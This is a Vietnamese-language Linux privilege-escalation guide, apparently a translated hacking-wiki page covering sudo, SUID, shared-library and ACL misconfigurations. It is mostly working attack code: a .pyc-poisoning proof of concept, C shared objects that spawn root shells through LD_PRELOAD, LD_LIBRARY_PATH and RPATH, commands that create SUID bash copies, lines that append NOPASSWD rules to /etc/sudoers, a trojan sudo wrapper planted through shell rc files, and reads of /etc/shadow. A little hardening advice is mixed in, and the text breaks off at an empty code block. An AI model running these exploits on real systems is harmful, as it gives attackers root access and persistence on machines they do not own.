Nếu một **script Python được phép chạy bằng sudo** import một module có thư mục package chứa **`__pycache__` có thể ghi**, bạn có thể thay thế `.pyc` đã lưu trong cache và thực thi mã với quyền của người dùng đặc quyền ở lần import tiếp theo.<sup>[[30]](#references)</sup>

- Cách hoạt động:
  - CPython lưu bytecode cache trong `__pycache__/module.cpython-<ver>.pyc`.<sup>[[31]](#references)</sup>
  - Trình thông dịch kiểm tra **header** (magic + metadata dấu thời gian/hash gắn với source), rồi thực thi code object đã marshal nằm sau header đó.
  - Nếu có thể **xóa và tạo lại** tệp cache vì thư mục có thể ghi, bạn vẫn có thể thay thế một tệp `.pyc` thuộc sở hữu của root nhưng không thể ghi.
- Đường dẫn thường gặp:
  - `sudo -l` hiển thị một script hoặc wrapper Python mà bạn có thể chạy với quyền root.
  - Script đó import một module cục bộ từ `/opt/app/`, `/usr/local/lib/...`, v.v.
  - Thư mục `__pycache__` của module được import có thể ghi bởi người dùng của bạn hoặc tất cả mọi người.

Liệt kê nhanh:

```bash
sudo -l
find / -type d -name __pycache__ -writable 2>/dev/null
find / -type f -path '*/__pycache__/*.pyc' -ls 2>/dev/null
```

Nếu bạn có thể kiểm tra script có đặc quyền, hãy xác định các module được import và đường dẫn cache của chúng:<sup>[[32]](#references)</sup>

```bash
grep -R "^import \\|^from " /opt/target/ 2>/dev/null
python3 - <<'PY'
import importlib.util
spec = importlib.util.find_spec("target_module")
print(spec.origin)
print(spec.cached)
PY
```

Quy trình khai thác:

1. Chạy script được phép dùng với sudo một lần để Python tạo tệp cache hợp lệ nếu tệp này chưa tồn tại.
2. Đọc 16 byte đầu tiên từ tệp `.pyc` hợp lệ và dùng lại chúng trong tệp bị đầu độc.
3. Biên dịch một code object chứa payload, dùng `marshal.dumps(...)` để tuần tự hóa nó, xóa tệp cache ban đầu rồi tạo lại tệp đó bằng header gốc cùng bytecode độc hại của bạn.
4. Chạy lại script được phép dùng với sudo để quá trình import thực thi payload của bạn với quyền root.

Lưu ý quan trọng:

- Dùng lại header gốc là yếu tố then chốt vì Python kiểm tra metadata của cache đối chiếu với tệp nguồn, chứ không kiểm tra xem phần thân bytecode có thực sự khớp với mã nguồn hay không.
- Cách này đặc biệt hữu ích khi tệp nguồn thuộc sở hữu của root và không có quyền ghi, nhưng thư mục `__pycache__` chứa tệp đó thì có quyền ghi.
- `PYTHONDONTWRITEBYTECODE=1` và `python -B` ngăn Python ghi các tệp `.pyc` mới; chúng **không** ngăn Python tải một cache hợp lệ có sẵn đã bị kẻ tấn công thay thế. Ranh giới quan trọng là liệu người dùng có đặc quyền thấp hơn có thể thay thế một cache mà quá trình import với đặc quyền cao sẽ chấp nhận hay không. Python kiểm tra metadata dấu thời gian/kích thước hoặc hash trước khi tải bytecode đã lưu trong cache. Xem [tài liệu tham khảo về import của Python](https://docs.python.org/3.12/reference/import.html#cached-bytecode-invalidation) và [tài liệu về dòng lệnh](https://docs.python.org/3.12/using/cmdline.html#envvar-PYTHONDONTWRITEBYTECODE).

Dạng proof-of-concept tối giản:

```python
import marshal, pathlib, subprocess, tempfile

pyc = pathlib.Path("/opt/app/__pycache__/target.cpython-312.pyc")
header = pyc.read_bytes()[:16]
payload = "import os; os.system('cp /bin/bash /tmp/rbash && chmod 4755 /tmp/rbash')"

with tempfile.TemporaryDirectory() as d:
    src = pathlib.Path(d) / "x.py"
    src.write_text(payload)
    code = compile(src.read_text(), str(src), "exec")
    pyc.unlink()
    pyc.write_bytes(header + marshal.dumps(code))

subprocess.run(["sudo", "/opt/app/runner.py"])
```

Gia cố:

- Đảm bảo không thư mục nào trong đường dẫn import Python có đặc quyền cho phép người dùng có đặc quyền thấp ghi, bao gồm cả `__pycache__`.
- Kiểm tra chủ sở hữu và quyền của thư mục cache, bao gồm cả các tệp `.pyc` hiện có. Tắt việc ghi bytecode có thể giảm việc tạo cache mới, nhưng không vô hiệu hóa cache hiện có có thể bị thay thế.
- Xử lý các module Python cục bộ có thể ghi và thư mục cache có thể ghi giống như cách bạn xử lý các shell script hoặc thư viện dùng chung có thể ghi được thực thi bởi root.

### BASH_ENV được giữ lại qua sudo env_keep → shell root

Nếu sudoers giữ lại `BASH_ENV` (ví dụ: `Defaults env_keep+="ENV BASH_ENV"`), bạn có thể tận dụng hành vi khởi động của Bash không tương tác để chạy mã tùy ý với quyền root khi gọi một lệnh được phép.<sup>[[24]](#references)</sup>

- Vì sao hoạt động: Với shell không tương tác, Bash đánh giá `$BASH_ENV` và source tệp đó trước khi chạy script đích. Nhiều quy tắc sudo cho phép chạy script hoặc shell wrapper. Nếu `BASH_ENV` được sudo giữ lại, tệp của bạn sẽ được source với quyền root.<sup>[[23]](#references)</sup>

- Yêu cầu:
  - Một quy tắc sudo mà bạn có thể chạy (bất kỳ mục tiêu nào gọi `/bin/bash` ở chế độ không tương tác, hoặc bất kỳ bash script nào).
  - `BASH_ENV` có trong `env_keep` (kiểm tra bằng `sudo -l`).

- PoC:

```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```

- Tăng cường bảo mật:
  - Xóa `BASH_ENV` (và `ENV`) khỏi `env_keep`, ưu tiên `env_reset`.
  - Tránh dùng shell wrapper cho các lệnh được phép chạy qua sudo; dùng binary tối giản.
  - Cân nhắc ghi log I/O của sudo và cảnh báo khi sử dụng các biến môi trường được giữ lại.

### Terraform qua sudo với HOME được giữ lại (!env_reset)

Khi sudo cho phép chạy Terraform với tư cách người dùng có đặc quyền cao hơn, `!env_reset` là dấu hiệu để kiểm tra những biến môi trường nào thực sự được giữ lại theo quy tắc cụ thể đó. Hãy xác nhận `HOME` hoặc `TF_CLI_CONFIG_FILE` thực tế trước khi xem `.terraformrc` hoặc `terraform.rc` mà người gọi có thể ghi là cấu hình CLI đang hoạt động. Mục `provider_installation.dev_overrides` chỉ có tác dụng nếu lệnh Terraform cố định tải provider đó và người gọi có thể đặt executable của nó vào thư mục được chọn.<sup>[[25]](#references)</sup>

- Trỏ provider cần dùng đến một thư mục có thể ghi và đặt vào đó một plugin độc hại có tên theo provider (ví dụ: `terraform-provider-examples`):

```hcl
# ~/.terraformrc
provider_installation {
  dev_overrides {
    "previous.htb/terraform/examples" = "/dev/shm"
  }
  direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```

Terraform sẽ thất bại ở bước bắt tay với plugin Go nhưng thực thi payload với quyền root trước khi thoát, để lại một shell SUID.

### Ghi đè TF_VAR + bypass xác thực symlink

Có thể cung cấp biến Terraform thông qua các biến môi trường `TF_VAR_<name>` nếu quy tắc sudo cụ thể giữ lại chúng. Việc **đọc** qua symlink nguồn cũng cần một provider đi theo liên kết và sao chép kết quả được bảo vệ đến một đích mà caller có thể đọc. Riêng việc **ghi** qua symlink đích cần có một mục đích đến do caller kiểm soát và một provider có đặc quyền đi theo liên kết khi ghi; một tác vụ được lên lịch sau đó chỉ là một hệ quả có thể xảy ra. Trước khi thử một trong hai hướng, hãy kiểm tra chính xác quyền sudo được cấp, các tệp `.tf` liên quan, cấu hình CLI được chọn và quyền sở hữu đường dẫn bằng các lệnh chỉ đọc như `sudo -l`, `stat` và `readlink`. Các bước xác thực yếu chỉ kiểm tra chuỗi như `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` không phân giải symlink:<sup>[[25]](#references)</sup>

```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```

Terraform phân giải symlink và sao chép `/root/root.txt` thật vào một đích mà kẻ tấn công có thể đọc. Có thể dùng cách tương tự để **ghi** vào các đường dẫn đặc quyền bằng cách tạo sẵn symlink ở đích (ví dụ: trỏ đường dẫn đích của provider vào bên trong `/etc/cron.d/`).

### requiretty / !requiretty

Trên một số bản phân phối cũ, sudo có thể được cấu hình với `requiretty`, buộc sudo chỉ chạy từ một TTY tương tác. Nếu đặt `!requiretty` (hoặc không có tùy chọn này), sudo có thể được thực thi từ các ngữ cảnh không tương tác như reverse shells, cron jobs hoặc scripts.

```bash
Defaults !requiretty
```

Đây không phải là một lỗ hổng trực tiếp, nhưng nó mở rộng các tình huống có thể lạm dụng quy tắc sudo mà không cần PTY đầy đủ.

### Sudo env_keep+=PATH / secure_path không an toàn → chiếm quyền PATH

Nếu `sudo -l` hiển thị `env_keep+=PATH` hoặc `secure_path` chứa các mục mà kẻ tấn công có thể ghi (ví dụ: `/home/<user>/bin`), một lệnh bên ngoài không dùng đường dẫn đầy đủ trong mục tiêu được sudo cho phép có thể bị thay thế.<sup>[[3]](#references)</sup> Việc không có `secure_path` hiệu lực cũng đáng được xem xét **nếu** môi trường sudo của lệnh giữ lại `PATH` do người gọi kiểm soát; chỉ riêng việc không có nó không chứng minh điều này. Đọc script được cho phép mà không chạy, sau đó xác minh chính xác quy tắc RunAs và đối số, đường dẫn tìm kiếm lệnh hiệu lực, cùng một thư mục có thể ghi và truy cập được nằm trước trong thứ tự tìm kiếm, chứa tên lệnh đó. Xác thực, `NOEXEC`, các lệnh tích hợp của shell và đường dẫn lệnh tuyệt đối có thể làm thay đổi kết quả.

- Yêu cầu: một quy tắc sudo (thường là `NOPASSWD`) chạy script/binary gọi các lệnh không dùng đường dẫn tuyệt đối (`free`, `df`, `ps`, v.v.) và một mục PATH có thể ghi được, được tìm kiếm đầu tiên.

```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```

### Bỏ qua đường dẫn khi thực thi Sudo
**Nhảy** để đọc các tệp khác hoặc sử dụng **symlinks**. Ví dụ trong tệp sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_

```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```

Nếu sử dụng **ký tự đại diện** (\*), thì còn dễ hơn:

```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```

**Biện pháp đối phó**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Lệnh Sudo/SUID binary không có đường dẫn lệnh

Nếu **quyền sudo** được cấp cho một lệnh duy nhất **mà không chỉ định đường dẫn**: _hacker10 ALL= (root) less_, bạn có thể khai thác bằng cách thay đổi biến PATH

```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```

Kỹ thuật này cũng có thể được sử dụng nếu một binary **suid** **thực thi một lệnh khác mà không chỉ định đường dẫn đến lệnh đó (luôn kiểm tra nội dung của một binary SUID lạ bằng** _**strings**_**)**.

[Ví dụ payload để thực thi.](../../processes-crontab-systemd-dbus/payloads-to-execute.md)

### Binary SUID có đường dẫn lệnh

Nếu binary **suid** **thực thi một lệnh khác và chỉ định đường dẫn**, bạn có thể thử **export một function** có tên trùng với lệnh mà file suid đang gọi.

Ví dụ, nếu một binary suid gọi _**/usr/sbin/service apache2 start**_, bạn cần thử tạo và export function đó:

```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```

Sau đó, khi bạn gọi binary suid, hàm này sẽ được thực thi

### Wrapper copy SUID tùy chỉnh

Một tiện ích SUID thuộc sở hữu của root, chấp nhận đường dẫn nguồn và đích, có thể vượt qua hai ranh giới tin cậy khác nhau. Nếu tiện ích tạo lệnh shell từ một trong hai đối số (ví dụ: truyền một lệnh `cp` được tạo sẵn cho `system()`), các ký tự đặc biệt của shell có thể thực thi lệnh khác với quyền hiệu lực của tiện ích. Ngay cả khi tiện ích gọi `cp` an toàn mà không dùng shell, đích không bị giới hạn vẫn có thể cho phép ghi tùy ý bằng quyền cao vào các tệp như `/etc/passwd`. Hãy xem xét cách wrapper xử lý đối số, hành vi của effective UID, các giới hạn đối với đích và liệu nội dung tệp được sao chép có do caller kiểm soát hay không; chỉ riêng thông báo lỗi chung của `cp` hoặc bit SUID không chứng minh được khả năng khai thác theo cách nào. Hãy liệt kê binary và quyền của nó một cách thụ động trước khi thử nghiệm thủ công.

### Script có thể ghi được do wrapper SUID thực thi

Một lỗi cấu hình thường gặp trong ứng dụng tùy chỉnh là wrapper binary SUID thuộc sở hữu của root thực thi một script, trong khi người dùng có quyền thấp có thể ghi vào chính script đó.

Mẫu phổ biến:

```c
int main(void) {
    system("/bin/bash /usr/local/bin/backup.sh");
}
```

Nếu `/usr/local/bin/backup.sh` có thể ghi được, bạn có thể nối thêm các lệnh payload rồi thực thi wrapper SUID:

```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```

Kiểm tra nhanh:

```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```

Đường tấn công này đặc biệt phổ biến trong các wrapper “maintenance”/“backup” được cung cấp trong `/usr/local/bin`.

### LD_PRELOAD & **LD_LIBRARY_PATH**

Biến môi trường **LD_PRELOAD** được dùng để chỉ định một hoặc nhiều shared library (tệp .so) sẽ được loader nạp trước tất cả các thư viện khác, bao gồm cả thư viện C chuẩn (`libc.so`). Quá trình này được gọi là preloading một thư viện.

Tuy nhiên, để duy trì bảo mật hệ thống và ngăn tính năng này bị khai thác, đặc biệt là với các executable **suid/sgid**, hệ thống áp dụng một số điều kiện:

- Loader bỏ qua **LD_PRELOAD** đối với các executable mà user ID thực (_ruid_) không khớp với user ID hiệu lực (_euid_).
- Đối với executable có suid/sgid, chỉ các thư viện nằm trong đường dẫn chuẩn và cũng có suid/sgid mới được preload.

Có thể leo thang đặc quyền nếu bạn có khả năng thực thi lệnh bằng `sudo` và đầu ra của `sudo -l` có dòng **env_keep+=LD_PRELOAD**. Cấu hình này cho phép biến môi trường **LD_PRELOAD** được giữ lại và nhận diện ngay cả khi lệnh được chạy bằng `sudo`, từ đó có khả năng dẫn đến việc thực thi mã tùy ý với đặc quyền cao hơn.<sup>[[9]](#references)</sup>

```
Defaults        env_keep += LD_PRELOAD
```

Lưu dưới dạng **/tmp/pe.c**

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

Sau đó **biên dịch nó** bằng:

```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

Cuối cùng, **leo thang đặc quyền** bằng cách chạy

```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```

> [!CAUTION]
> Có thể lợi dụng một privesc tương tự nếu kẻ tấn công kiểm soát biến môi trường **LD_LIBRARY_PATH**, vì họ kiểm soát đường dẫn nơi các thư viện sẽ được tìm kiếm.

```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```

### Tệp nhị phân SUID – .so injection

Khi gặp một tệp nhị phân có quyền **SUID** trông bất thường, bạn nên kiểm tra xem nó có tải các tệp **.so** đúng cách hay không.<sup>[[17]](#references)</sup>

```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```

Ví dụ: nếu gặp lỗi như _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_, điều đó cho thấy có thể khai thác được.

Để khai thác, ta sẽ tạo một file C, chẳng hạn _"/path/to/.config/libcalc.c"_, chứa đoạn mã sau:

```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```

Đoạn mã này, sau khi được biên dịch và thực thi, nhằm nâng quyền bằng cách thao túng quyền của tệp và thực thi một shell với quyền cao hơn.

Biên dịch tệp C ở trên thành một tệp shared object (.so) bằng cách:

```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```

Cuối cùng, chạy binary SUID bị ảnh hưởng sẽ kích hoạt exploit, có khả năng dẫn đến xâm phạm hệ thống.

## Shared Object Hijacking

```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```

Bây giờ chúng ta đã tìm thấy một binary SUID tải thư viện từ thư mục mà chúng ta có thể ghi, hãy tạo thư viện trong thư mục đó với tên cần thiết:

```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

Nếu bạn gặp lỗi như

```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```

điều đó có nghĩa là thư viện bạn đã tạo cần có một hàm tên là `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) là danh sách được tuyển chọn các binary Unix mà kẻ tấn công có thể khai thác để vượt qua các hạn chế bảo mật cục bộ. [**GTFOArgs**](https://gtfoargs.github.io/) cũng tương tự, nhưng dành cho các trường hợp bạn **chỉ có thể inject arguments** vào một command.

Dự án tập hợp các chức năng hợp pháp của binary Unix có thể bị lạm dụng để thoát khỏi restricted shell, leo thang hoặc duy trì đặc quyền nâng cao, chuyển tệp, tạo bind shell và reverse shell, cũng như hỗ trợ các tác vụ post-exploitation khác.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Nếu bạn có thể truy cập `sudo -l`, bạn có thể dùng công cụ [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) để kiểm tra xem công cụ có tìm ra cách khai thác bất kỳ quy tắc sudo nào hay không.

### Tái sử dụng Sudo Token

Trong trường hợp bạn có **quyền truy cập sudo** nhưng không có mật khẩu, bạn có thể leo thang đặc quyền bằng cách **chờ một command sudo được thực thi rồi chiếm session token**.<sup>[[18]](#references)</sup>

Các yêu cầu để leo thang đặc quyền:

- Bạn đã có shell với tư cách người dùng "_sampleuser_"
- "_sampleuser_" đã **dùng `sudo`** để thực thi một thứ gì đó trong **15 phút gần đây** (theo mặc định, đó là thời hạn của sudo token cho phép chúng ta dùng `sudo` mà không cần nhập mật khẩu)
- `cat /proc/sys/kernel/yama/ptrace_scope` có giá trị 0
- Có thể truy cập `gdb` (bạn có thể tải nó lên)

(Bạn có thể tạm thời bật `ptrace_scope` bằng lệnh `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` hoặc bật vĩnh viễn bằng cách sửa đổi `/etc/sysctl.d/10-ptrace.conf` và đặt `kernel.yama.ptrace_scope = 0`)

Nếu đáp ứng tất cả các yêu cầu này, **bạn có thể leo thang đặc quyền bằng cách dùng:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- **Exploit đầu tiên** (`exploit.sh`) sẽ tạo binary `activate_sudo_token` trong _/tmp_. Bạn có thể dùng nó để **kích hoạt sudo token trong session của mình** (bạn sẽ không tự động nhận được root shell, hãy chạy `sudo su`):

```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```

- **Exploit thứ hai** (`exploit_v2.sh`) sẽ tạo một shell sh trong _/tmp_ **do root sở hữu và có setuid**

```bash
bash exploit_v2.sh
/tmp/sh -p
```

- **Exploit thứ ba** (`exploit_v3.sh`) sẽ **tạo một tệp sudoers** khiến **sudo tokens tồn tại vĩnh viễn và cho phép tất cả người dùng sử dụng sudo**

```bash
bash exploit_v3.sh
sudo su
```

### /var/run/sudo/ts/\<Username>

Nếu bạn có **quyền ghi** trong thư mục hoặc trên bất kỳ tệp nào được tạo bên trong thư mục, bạn có thể dùng binary [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) để **tạo sudo token cho một user và PID**.\
Ví dụ, nếu bạn có thể ghi đè tệp _/var/run/sudo/ts/sampleuser_ và có shell dưới quyền user đó với PID 1234, bạn có thể **có được quyền sudo** mà không cần biết mật khẩu bằng cách chạy:

```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```

### /etc/sudoers, /etc/sudoers.d

Tệp `/etc/sudoers` và các tệp bên trong `/etc/sudoers.d` cấu hình những ai có thể dùng `sudo` và cách sử dụng. Các tệp này **theo mặc định chỉ có thể được đọc bởi user root và group root**.\
**Nếu** bạn có thể **đọc** tệp này, bạn có thể **thu thập một số thông tin hữu ích**; nếu có thể **ghi** vào bất kỳ tệp nào, bạn sẽ có thể **escalate privileges**.

```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```

Nếu bạn có thể ghi, bạn có thể lạm dụng quyền này.

```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```

Một cách khác để lạm dụng các quyền này:

```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```

### DOAS

Có một số lựa chọn thay thế cho binary `sudo`, chẳng hạn như `doas` trên OpenBSD. Hãy nhớ kiểm tra cấu hình của nó tại `/etc/doas.conf`

```bash
permit nopass demo as root cmd vim
permit nopass demo as root cmd python3
permit nopass keepenv demo as root cmd /opt/backup.sh
```

Nếu `doas` cho phép dùng trình chỉnh sửa hoặc trình thông dịch, hãy kiểm tra các cách thoát kiểu GTFOBins:

```bash
doas vim
:!/bin/sh
```

Một quy tắc `doas` có thể chạy với quyền root dành cho `dstat` nguyên bản viết bằng Python cũng đáng được kiểm tra về đường dẫn plugin. [Tài liệu hướng dẫn](https://github.com/dstat-real/dstat/blob/master/docs/dstat.1) và [mã nguồn](https://github.com/dstat-real/dstat/blob/master/dstat) liệt kê `/usr/share/dstat/` và `/usr/local/share/dstat/` trong số các vị trí chứa plugin `dstat_*.py`. Nếu người dùng hiện tại có thể ghi vào và truy cập một vị trí thực sự được bản dựng đã cài đặt sử dụng, plugin được chọn có thể chạy dưới danh tính RunAs của `doas`. Hãy xác nhận quy tắc có hiệu lực, cách bản dựng đó tìm plugin, quyền trên thư mục và thư mục cha hoặc ACL, cũng như liệu người gọi có thể chọn plugin hay không; chỉ riêng quy tắc `dstat` hoặc thư mục có quyền ghi mới chỉ là manh mối. Các bản triển khai `dstat` khác có thể dùng hệ thống plugin khác. Hãy kiểm tra metadata một cách thụ động, không tải plugin.

### Sudo Hijacking

Nếu bạn biết **một người dùng thường kết nối đến máy và dùng `sudo`** để leo thang đặc quyền, đồng thời bạn có được một shell trong ngữ cảnh của người dùng đó, bạn có thể **tạo một tệp thực thi sudo mới** để chạy mã của bạn với quyền root rồi chạy lệnh của người dùng. Sau đó, **sửa đổi $PATH** trong ngữ cảnh người dùng (ví dụ: thêm đường dẫn mới vào .bash_profile) để khi người dùng chạy sudo, tệp thực thi sudo của bạn sẽ được chạy.

Lưu ý rằng nếu người dùng dùng shell khác (không phải bash), bạn sẽ cần sửa đổi các tệp khác để thêm đường dẫn mới. Ví dụ, [sudo-piggyback](https://github.com/APTy/sudo-piggyback) sửa đổi `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Bạn có thể tìm thấy một ví dụ khác trong [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Hoặc chạy thứ gì đó như:

```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```

## Thư viện dùng chung

### ld.so

Tệp `/etc/ld.so.conf` cho biết **các tệp cấu hình được tải từ đâu**. Thông thường, tệp này chứa đường dẫn sau: `include /etc/ld.so.conf.d/*.conf`

Điều đó có nghĩa là các tệp cấu hình từ `/etc/ld.so.conf.d/*.conf` sẽ được đọc. Các tệp cấu hình này **trỏ đến những thư mục khác** nơi các **thư viện** sẽ được **tìm kiếm**. Ví dụ: nội dung của `/etc/ld.so.conf.d/libc.conf` là `/usr/local/lib`. **Điều này có nghĩa là hệ thống sẽ tìm kiếm thư viện bên trong `/usr/local/lib`**.

Nếu vì lý do nào đó **một người dùng có quyền ghi** vào bất kỳ đường dẫn nào được chỉ định: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, bất kỳ tệp nào bên trong `/etc/ld.so.conf.d/` hoặc bất kỳ thư mục nào được khai báo trong tệp cấu hình bên trong `/etc/ld.so.conf.d/*.conf`, người đó có thể nâng cao đặc quyền.\
Hãy xem **cách khai thác cấu hình sai này** trong trang sau:


{{#ref}}
../../interesting-files-permissions/ld.so.conf-example.md
{{#endref}}

### RPATH

```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
 0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
 linux-gate.so.1 =>  (0x0068c000)
 libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x005bb000)
```

Bằng cách sao chép lib vào `/var/tmp/flag15/`, chương trình sẽ sử dụng lib tại vị trí này theo chỉ định trong biến `RPATH`.

```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
 linux-gate.so.1 =>  (0x005b0000)
 libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x00737000)
```

Sau đó tạo một thư viện độc hại trong /var/tmp bằng `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`

```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
 char *file = SHELL;
 char *argv[] = {SHELL,0};
 setresuid(geteuid(),geteuid(), geteuid());
 execve(file,argv,0);
}
```

## Capabilities

Linux capabilities cung cấp **một tập con các quyền root hiện có cho một process**. Điều này chia **các quyền root thành những đơn vị nhỏ hơn và riêng biệt**. Sau đó, mỗi đơn vị có thể được cấp độc lập cho các process. Nhờ vậy, toàn bộ tập quyền được thu hẹp, giảm nguy cơ bị khai thác.\
Đọc trang sau để **tìm hiểu thêm về capabilities và cách lạm dụng chúng**:


{{#ref}}
../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Quyền thư mục

Trong một thư mục, **bit "execute"** có nghĩa là người dùng chịu ảnh hưởng có thể dùng "**cd**" để vào thư mục.\
Bit **"read"** có nghĩa là người dùng có thể **liệt kê** các **file**, còn bit **"write"** có nghĩa là người dùng có thể **xóa** và **tạo** các **file** mới.

## ACLs

Access Control Lists (ACLs) là lớp quyền tùy ý thứ cấp, có khả năng **ghi đè các quyền ugo/rwx truyền thống**. Các quyền này tăng cường khả năng kiểm soát truy cập vào file hoặc thư mục bằng cách cho phép hoặc từ chối quyền đối với những người dùng cụ thể không phải chủ sở hữu hoặc thành viên của nhóm. Mức độ **chi tiết này đảm bảo việc quản lý quyền truy cập chính xác hơn**. Bạn có thể tìm thêm thông tin [**tại đây**](https://linuxconfig.org/how-to-manage-acls-on-linux).<sup>[[19]](#references)</sup>

**Cấp** cho người dùng "kali" quyền đọc và ghi đối với một file:

```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```

**Lấy** các tệp có ACL cụ thể từ hệ thống:

```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```

### Cửa hậu ACL ẩn trong các tệp cấu hình bổ sung của sudoers

Một lỗi cấu hình phổ biến là tệp thuộc sở hữu của root trong `/etc/sudoers.d/` có quyền `440` nhưng vẫn cấp quyền ghi cho người dùng có đặc quyền thấp thông qua ACL.

```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```

Nếu bạn thấy dạng như `user:alice:rw-`, người dùng có thể thêm quy tắc sudo dù các bit quyền hạn chế:

```bash
